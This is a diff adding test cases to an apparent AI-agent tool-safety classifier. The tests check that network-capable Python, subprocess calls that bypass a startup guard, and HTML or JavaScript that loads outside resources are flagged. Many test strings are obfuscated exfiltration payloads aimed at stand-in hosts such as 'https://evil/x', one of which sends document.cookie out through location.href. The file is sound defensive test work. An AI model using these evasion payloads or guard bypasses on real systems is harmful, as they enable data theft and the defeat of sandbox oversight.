@@ -926,6 +926,9 @@ def test_terminal_classifier(command, unsafe):
             "from huggingface_hub import snapshot_download\nsnapshot_download('r')",
             True,
         ),  # bare-imported repo snapshot download
+        ("import httpcore\nhttpcore.request('GET', 'https://example.com')", True),
+        ("import boto3\nboto3.client('s3').list_buckets()", True),
+        ("from botocore.session import get_session\nget_session()", True),
         ("import statistics\nstatistics.mean([1, 2])", False),  # benign stdlib import stays safe
         # A concrete write callable handed to a user-defined helper that can
         # invoke it bypasses the direct open()/writer site, so it asks.
@@ -946,6 +949,66 @@ def test_terminal_classifier(command, unsafe):
 )
 def test_python_classifier(code, unsafe):
     assert is_potentially_unsafe_tool_call("python", {"code": code}) is unsafe
+
+
+def test_python_runtime_safety_blocks_child_startup_guard_bypass():
+    from core.inference.tools import _check_code_safety
+
+    assert (
+        _check_code_safety("import subprocess\nsubprocess.run(['python','-c','print(1)'])") is None
+    )
+    assert (
+        _check_code_safety(
+            "import os, subprocess\n"
+            "subprocess.run(['python','-c','print(1)'], env=os.environ.copy())"
+        )
+        is None
+    )
+    assert (
+        _check_code_safety(
+            "import subprocess\nsubprocess.run(['ignored','-c','print(1)'], executable='python')"
+        )
+        is None
+    )
+    assert (
+        _check_code_safety("import os\nos.execl('/usr/bin/python','python','-c','print(1)')")
+        is None
+    )
+    assert "runtime guard" in (
+        _check_code_safety("import subprocess\nsubprocess.run(['python','-S','-c','print(1)'])")
+        or ""
+    )
+    assert "runtime guard" in (
+        _check_code_safety(
+            "import subprocess\nsubprocess.run(args=['python','-S','-c','print(1)'])"
+        )
+        or ""
+    )
+    assert "runtime guard" in (
+        _check_code_safety(
+            "import subprocess\n"
+            "subprocess.run(['ignored','-S','-c','print(1)'], executable='python')"
+        )
+        or ""
+    )
+    assert "runtime guard" in (
+        _check_code_safety("from subprocess import *\nrun(['python','-S','-c','print(1)'])") or ""
+    )
+    assert "runtime guard" in (
+        _check_code_safety("import os\nos.execl('/usr/bin/python','python','-S','-c','print(1)')")
+        or ""
+    )
+    assert "runtime guard" in (
+        _check_code_safety("import subprocess\nsubprocess.run(['python','-c','print(1)'], env={})")
+        or ""
+    )
+    assert "runtime guard" in (
+        _check_code_safety(
+            "import os, subprocess\nos.environ.pop('PYTHONPATH', None)\n"
+            "subprocess.run(['python','-c','print(1)'])"
+        )
+        or ""
+    )
 
 
 def test_builtin_readonly_tools_are_safe():
@@ -970,6 +1033,10 @@ def test_render_html_gated_only_when_networked():
     assert rh("<script src='https://cdn/x.js'></script>") is True
     assert rh("<script>new XMLHttpRequest().open('GET','/x')</script>") is True
     assert rh("<img src='https://evil/pixel.png'>") is True
+    assert rh('<svg><image xlink:href="https://evil/x.png"/></svg>') is True
+    assert rh('<svg><use xlink:href="#local-symbol"/></svg>') is False
+    assert rh('<iframe srcdoc="<img src=https://evil/x>"></iframe>') is True
+    assert rh('<iframe srcdoc="<h1>Local report</h1>"></iframe>') is False
     # Worker / SharedWorker constructors run an off-thread script the scan cannot
     # see (a module worker from a CORS CDN, or a blob/same-origin worker that
     # fetches/importScripts) under worker-src http: https: blob:, so they ask.
@@ -984,6 +1051,13 @@ def test_render_html_gated_only_when_networked():
     assert rh("<img srcset='https://evil/x.png 1x'>") is True
     assert rh("<img src='/api/leak?d=1'>") is True  # root-relative resolves to origin
     assert rh("<link rel=stylesheet href='//cdn/x.css'>") is True  # protocol-relative
+    assert rh("<form action='https://evil/x' method='post'></form>") is True
+    assert rh("<video poster='https://evil/x.png'></video>") is True
+    assert rh("<object data='https://evil/x'></object>") is True
+    assert rh("<a ping='https://evil/x'>link</a>") is True
+    assert rh("<img srcset='local.png 1x, https://evil/x.png 2x'>") is True
+    assert rh("<a ping='local https://evil/x'>link</a>") is True
+    assert rh("<script>const data = '/tmp/file.json'</script>") is False
     # Self-navigation sinks exfiltrate by navigating the frame away.
     assert rh("<script>location.href='https://x/?d='+document.cookie</script>") is True
     assert rh("<script>location.assign('https://x')</script>") is True
@@ -995,11 +1069,310 @@ def test_render_html_gated_only_when_networked():
     # Obfuscated egress: a block comment splitting fetch(, or bracket access.
     assert rh("<script>fetch/*x*/('https://example.com')</script>") is True
     assert rh("<script>window['fetch']('https://example.com')</script>") is True
+    assert rh("<script>window[`fetch`]('https://example.com')</script>") is True
+    assert rh("<script>window[`fet`+`ch`]('https://example.com')</script>") is True
+    assert rh("<script>window['fetch'.replace('x','x')]('https://x')</script>") is True
+    assert rh("<script>window['fetch'+suffix]('https://x')</script>") is True
+    assert rh("<script>window[key]('https://x')</script>") is True
+    assert rh("<script>window?.['fetch']('https://x')</script>") is True
+    assert rh("<script>this['fetch']('https://x')</script>") is True
+    assert rh("<script>this[`fet`+`ch`]('https://x')</script>") is True
+    assert rh("<script>frames[0]</script>") is False
+    assert rh("<script>frames[0]['fetch']('https://x')</script>") is True
+    assert rh("<script>frames?.[0]?.['fetch']('https://x')</script>") is True
+    assert rh("<script>document.defaultView['fetch']('https://x')</script>") is True
+    assert rh("<script>navigator['serviceWorker'].register('/sw.js')</script>") is True
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('src','https://evil/x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute?.('src','https://evil/x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('s'+'rc','https://evil/x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('srcset','local.png 1x, https://evil/x.png 2x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>const a=document.createElement('a');"
+            "a.setAttribute('ping','local https://evil/x')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>image.setAttributeNS('http://www.w3.org/1999/xlink',"
+            "'href','https://evil/x.png')</script>"
+        )
+        is True
+    )
+    assert (
+        rh(
+            "<script>image.setAttributeNS('http://www.w3.org/1999/xlink',"
+            "'xlink:href','#local-symbol')</script>"
+        )
+        is False
+    )
+    assert rh("<script>const i={};i.setAttribute(name,'https://evil/x')</script>") is True
+    assert rh("<script>const i={};i.src='https://evil/x'</script>") is True
+    assert rh("<script>const i={};i.src='https:\\/\\/evil/x'</script>") is True
+    assert rh("<script>const i={};i.src='\\x68ttps://evil/x'</script>") is True
+    assert rh("<script>const i={};i.src='\\u0068ttps://evil/x'</script>") is True
+    assert rh("<script>const i={};i.src=source</script>") is True
+    assert rh("<script>const i={};i.src='./local.png'.replace('local','/api')</script>") is True
+    assert rh("<script>const i={};i.srcset='local.png 1x, https://evil/x 2x'</script>") is True
+    assert rh("<script>document.body.innerHTML='<img src=https://evil/x>'</script>") is True
+    assert rh("<script>document.body.innerHTML += '<img src=https://evil/x>'</script>") is True
+    assert rh("<script>document.body.innerHTML += '<p>Local</p>'</script>") is False
+    assert rh("<script>document.body.innerHTML ||= '<img src=https://evil/x>'</script>") is True
+    assert rh("<script>document.body.innerHTML='<p>Local</p>'</script>") is False
+    assert rh("<script>document.body.innerHTML=markup</script>") is True
+    assert rh("<script>frame.srcdoc='<img src=https://evil/x>'</script>") is True
+    assert rh("<script>frame.srcdoc='<h1>Local</h1>'</script>") is False
+    assert rh("<script>frame.srcdoc=markup</script>") is True
+    assert rh("<script>frame.setAttribute('srcdoc','<img src=https://evil/x>')</script>") is True
+    assert rh("<script>frame.setAttribute('srcdoc','<h1>Local</h1>')</script>") is False
+    assert rh("<script>img['src']='https://evil/x'</script>") is True
+    assert rh("<script>frame['srcdoc']='<img src=https://evil/x>'</script>") is True
+    assert rh("<script>document.body['inner'+'HTML']='<img src=https://evil/x>'</script>") is True
+    assert rh("<script>img['setAttribute']('src','https://evil/x')</script>") is True
+    assert (
+        rh("<script>node['insertAdjacentHTML']('beforeend','<img src=https://evil/x>')</script>")
+        is True
+    )
+    assert rh("<script>Reflect.set(img,'src','https://evil/x')</script>") is True
+    assert rh("<script>Object.assign(img,{src:'https://evil/x'})</script>") is True
+    assert rh("<script>Object.assign(frame,{'srcdoc':'<img src=https://evil/x>'})</script>") is True
+    assert rh("<script>Object.assign(new Image(), {['src']: 'https://evil/x'})</script>") is True
+    assert rh("<script>Object.assign(new Image(), {['src']: './local.png'})</script>") is False
+    assert rh("<script>Object.assign(new Image(), {[key]: 'https://evil/x'})</script>") is True
+    assert (
+        rh(
+            "<script>const key='title'; Object.assign(new Image(), {[key]: 'https://evil/x'})</script>"
+        )
+        is False
+    )
+    assert rh("<script>img['src']='./local.png'</script>") is False
+    assert rh("<script>img['setAttribute']('src','./local.png')</script>") is False
+    assert rh("<script>img.setAttribute.call(img, 'src', 'https://evil/x')</script>") is True
+    assert rh("<script>img.setAttribute.call(img, 'src', './local.png')</script>") is False
+    assert rh("<script>img.setAttribute.apply(img, ['src', 'https://evil/x'])</script>") is True
+    assert rh("<script>img.setAttribute.apply(img, ['src', './local.png'])</script>") is False
+    assert rh("<script>img.setAttribute.call(img, 'class', 'https://evil/x')</script>") is False
+    assert rh("<script>Reflect.set(obj,'title','https://evil/x')</script>") is False
+    assert (
+        rh("<script>Object.assign(obj,{src:'./local.png',title:'https://evil/x'})</script>")
+        is False
+    )
+    assert rh("<script>node.outerHTML='<script>fetch(1)<\\/script>'</script>") is True
+    assert rh("<script>node.insertAdjacentHTML('beforeend','<img src=/api/x>')</script>") is True
+    assert rh("<script>document.write('<img sr','c=https://evil/x>')</script>") is True
+    assert rh("<script>document.write`<img src=https://evil/x>`</script>") is True
+    assert rh("<script>document.write`<p>Local</p>`</script>") is False
+    assert rh("<script>document.write.call(document, '<img src=https://evil/x>')</script>") is True
+    assert rh("<script>document.write.call(document, '<p>Local</p>')</script>") is False
+    assert (
+        rh(
+            "<script>node.insertAdjacentHTML.apply(node, ['beforeend', '<img src=https://evil/x>'])</script>"
+        )
+        is True
+    )
+    assert (
+        rh("<script>node.insertAdjacentHTML.apply(node, ['beforeend', '<p>Local</p>'])</script>")
+        is False
+    )
+    assert (
+        rh(
+            "<script>document.createRange().createContextualFragment.call("
+            "document.createRange(), '<img src=https://evil/x>')</script>"
+        )
+        is True
+    )
+    assert rh("<script>document.writeln('<p>Local</p>')</script>") is False
+    assert rh("<script>writer.write('<img src=https://evil/x>')</script>") is False
+    # Optional-chained computed document.write still recurses into the markup.
+    assert rh("<script>document?.['write']('<img src=https://evil/x>')</script>") is True
+    assert rh("<script>document?.['write']('<p>Local</p>')</script>") is False
+    # document.open() returns the document, so a write through it is an HTML sink.
+    assert rh("<script>document.open().write('<img src=https://evil/x>')</script>") is True
+    assert (
+        rh("<script>document.open('text/html').writeln('<img src=https://evil/x>')</script>")
+        is True
+    )
+    assert rh("<script>document.open().write('<p>Local</p>')</script>") is False
+    assert (
+        rh(
+            "<script>document.createRange().createContextualFragment("
+            "'<img src=https://evil/x>')</script>"
+        )
+        is True
+    )
+    assert (
+        rh("<script>document.createRange().createContextualFragment('<p>Local</p>')</script>")
+        is False
+    )
+    assert rh("<script>[img.src] = ['https://evil/x']</script>") is True
+    assert rh("<script>[img.src] = ['./local.png']</script>") is False
+    assert rh("<script>({src: img.src} = {src:'https://evil/x'})</script>") is True
+    assert rh("<script>({src: img.src} = {src:'./local.png'})</script>") is False
+    assert rh("<script>const k='src'; img[k]='https://evil/x'</script>") is True
+    assert rh("<script>const k='src'; img[k]='./local.png'</script>") is False
+    assert rh("<script>const k='title'; img[k]='https://evil/x'</script>") is False
+    assert rh("<script>img[k]='https://evil/x'</script>") is True
+    # A dotted computed key carrying a static network URL fails closed; a
+    # dotted key assigning a non-network value stays a static canvas.
+    assert rh("<script>const o={k:'src'}; img[o.k]='https://evil/x'</script>") is True
+    assert rh("<script>const o={k:'color'}; el[o.k]='red'</script>") is False
+    # ES module loads of a remote/root URL need approval; a relative specifier
+    # (dynamic or static) stays a static canvas.
+    assert rh("<script>import('https://evil/x.js')</script>") is True
+    assert rh("<script type=module>import 'https://evil/x.js'</script>") is True
+    assert rh("<script type=module>import { a } from '/mod.js'</script>") is True
+    assert rh("<script>import('./local.js')</script>") is False
+    assert rh("<script type=module>import { a } from './util.js'</script>") is False
+    # An entity-obfuscated CSS URL is a network load after the browser decodes it.
+    assert rh('<div style="background:url(&#104;ttps://evil/x)"></div>') is True
+    assert rh('<div style="background:blue">&amp; local</div>') is False
+    # Module re-exports of a remote/root URL fetch that module; relative stays static.
+    assert rh("<script type=module>export * from 'https://evil/x.js'</script>") is True
+    assert rh("<script type=module>export {a} from '/mod.js'</script>") is True
+    assert rh("<script type=module>export {a} from './util.js'</script>") is False
+    assert rh("<script>export const config = 1;</script>") is False
+    # A reassigned computed-key alias is position-dependent, so it fails closed on
+    # a network value but a same-valued redefinition stays resolvable/static.
+    assert rh("<script>var k='src'; img[k]='https://evil/x'; var k='title';</script>") is True
+    assert rh("<script>var k='src'; var k='src'; img[k]='./local.png'</script>") is False
+    assert (
+        rh(
+            "<script>frame.setAttribute(name, "
+            "'data:text/html;base64,PGltZyBzcmM9aHR0cHM6Ly9ldmlsL3g+')</script>"
+        )
+        is True
+    )
+    assert (
+        rh("<script>frame.setAttribute(name, 'data:image/png;base64,iVBORw0KGgo=')</script>")
+        is False
+    )
+    assert (
+        rh(
+            "<script>const name='src'; frame.setAttribute(name, "
+            "'data:text/html;base64,PGltZyBzcmM9aHR0cHM6Ly9ldmlsL3g+')</script>"
+        )
+        is True
+    )
+    assert rh("<script>with(new Image()){src='https://evil/x'}</script>") is True
+    assert rh("<script>with(new Image()){src='./local.png'}</script>") is False
+    assert rh("<script>with(obj){let src='https://evil/x'}</script>") is False
+    assert rh("<script>with(new Image()) src='https://evil/x'</script>") is True
+    assert rh("<script>with(new Image()) src='./local.png'</script>") is False
+    assert rh("<script>with(obj) let src='https://evil/x'</script>") is False
     # A computed bracket key spliced from string fragments on a global host object.
     assert rh("<script>window['fet'+'ch']('https://attacker.example')</script>") is True
     assert rh("<script>self['open' + '']('https://x')</script>") is True
     # A computed key on a plain object (not a global host) stays a static canvas.
     assert rh("<script>var o={}; o['a'+'b']=1</script>") is False
+    assert rh("<script>var o={}; o['fetch']=1</script>") is False
+    assert rh("<script>window['isFetching']=false</script>") is False
+    assert rh("<script>window['openState']=false</script>") is False
+    # Local and fragment setAttribute values do not leave the canvas.
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('src','./local.png')</script>"
+        )
+        is False
+    )
+    assert rh('<iframe src="data:text/html,<img src=https://evil/x>"></iframe>') is True
+    assert (
+        rh('<iframe src="data:text/html,%3Cimg%20src%3Dhttps%3A%2F%2Fevil%2Fx%3E"></iframe>')
+        is True
+    )
+    assert (
+        rh('<iframe src="data:text/html;base64,PGltZyBzcmM9aHR0cHM6Ly9ldmlsL3g+"></iframe>') is True
+    )
+    assert rh('<iframe src="data:text/html,<h1>Local</h1>"></iframe>') is False
+    assert rh('<iframe src="data:text/plain,<img src=https://evil/x>"></iframe>') is False
+    assert rh('<img src="data:image/png;base64,iVBORw0KGgo=">') is False
+    assert rh('<object data="data:image/svg+xml,<image href=https://evil/x>"></object>') is True
+    assert rh('<iframe src="data:text/html;base64,not-valid-***"></iframe>') is True
+    # A declared charset is honoured so a UTF-16 document is decoded like the
+    # browser would; an unknown charset fails closed instead of hiding the load.
+    assert (
+        rh(
+            '<iframe src="data:text/html;charset=utf-16le;base64,'
+            'PABpAG0AZwAgAHMAcgBjAD0AaAB0AHQAcABzADoALwAvAGUAdgBpAGwALwB4AD4A"></iframe>'
+        )
+        is True
+    )
+    assert (
+        rh(
+            '<iframe src="data:text/html;charset=utf-16le;base64,'
+            'PABoADEAPgBMAG8AYwBhAGwAPAAvAGgAMQA+AA=="></iframe>'
+        )
+        is False
+    )
+    assert (
+        rh('<iframe src="data:text/html;charset=nonesuch,%3Cimg%3E"></iframe>') is True
+    )  # unknown charset fails closed
+    assert rh("<script>frame.src='data:text/html,<img src=https://evil/x>'</script>") is True
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute?.('src','./local.png')</script>"
+        )
+        is False
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('s'+'rc','./local.png')</script>"
+        )
+        is False
+    )
+    assert rh("<script>const i={};i.setAttribute(name,'./local.png')</script>") is False
+    assert rh("<script>const i={};i.setAttribute('class','https://evil/x')</script>") is False
+    assert rh("<script>const i={};i.setAttribute('disabled')</script>") is False
+    assert rh("<script>const i={};i.src='./local.png'</script>") is False
+    assert (
+        rh("<script>const a=document.createElement('a');a.setAttribute('href','#section')</script>")
+        is False
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('src',`data:image/png;base64,AA==`)</script>"
+        )
+        is False
+    )
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('src','/' + 'api/image')</script>"
+        )
+        is True
+    )
+    assert (
+        rh("<script>const i=document.createElement('img');i.setAttribute('src',source)</script>")
+        is True
+    )
     assert rh("<script>/* just a note */ var x = 1</script>") is False  # comment only
     # A meta-refresh with a url navigates the frame to an external origin.
     assert rh('<meta http-equiv="refresh" content="0;url=https://example.com">') is True
